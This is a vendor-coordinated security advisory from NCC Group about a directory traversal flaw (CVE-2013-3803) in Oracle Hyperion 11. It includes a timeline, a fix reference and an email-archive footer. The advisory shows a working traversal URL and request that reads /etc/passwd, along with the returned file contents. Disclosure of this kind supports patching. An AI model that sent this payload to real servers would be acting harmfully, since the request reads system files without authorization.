@@ -1,0 +1,82 @@
+=======
+Summary
+=======
+Name: Oracle Hyperion 11 - Directory Traversal
+Release Date: 30 July 2013
+Reference: NGS00434
+Discoverer: Richard Warren <richard.warren@nccgroup.com>
+Vendor: Oracle
+Vendor Reference: S0318807
+Systems Affected: Oracle Hyperion 11.1.1.3, 11.1.1.4.107 and earlier, 11.1.2.1.129 and earlier, and 11.1.2.2.305 and earlier
+Risk: High
+Status: Published
+
+========
+TimeLine
+========
+Discovered: 20 November 2012
+Released: 20 November 2012
+Approved: 20 November 2012
+Reported: 20 November 2012
+Fixed: 16 July 2013
+Published: 30 July 2013
+
+===========
+Description
+===========
+Product: Oracle
+Application: Hyperion
+Version: 11.x
+
+Vulnerability
+-------------
+
+The application was found to be vulnerable to a directory traversal attack.
+The following URL resulted in directory transversal.
+http://localhost:19000/raframework/ihtml/GetResource?DocUUID=00000122ad09cf47-0000-d521-0aeaf211&DocInstanceID=1&ResourceName=../../../../../../../../../../../../../../../../LFI_HERE
+
+=================
+Technical Details
+=================
+Exploitation
+------------
+
+The following request/response was observed:
+
+GET
+/raframework/ihtml/GetResource?DocUUID=00000122ad09cf47-0000-d521-0aeaf211&DocInstanceID=1&ResourceName=../../../../../../../../../../../../../../../../etc/passwd
+HTTP/1.0
+
+HTTP/1.1 200 OK
+Date: Mon, 12 Nov 2012 15:28:10 GMT
+Server: Oracle-Application-Server-11g
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Mon, 1 Jan 1990 00:00:00 GMT
+Last-Modified: Mon, 12 Nov 2012 15:28:10 GMT
+X-ORACLE-DMS-ECID: 004n^rmuJTjAtH^5lV5EiZ0004FS0058zX
+X-Powered-By: Servlet/2.5 JSP/2.1
+Connection: close
+Content-Type: text/plain
+Content-Language: en
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+--SNIP--
+
+===============
+Fix Information
+===============
+Fixed in Oracle CPU July 2013:
+http://www.oracle.com/technetwork/topics/security/cpujuly2013-1899826.html
+Assigned CVE-2013-3803
+
+
+NCC Group Research
+http://www.nccgroup.com/research
+
+
+For more information please visit <a href="http://www.mimecast.com">http://www.mimecast.com<br>
+This email message has been delivered safely and archived online by Mimecast.
+</a>
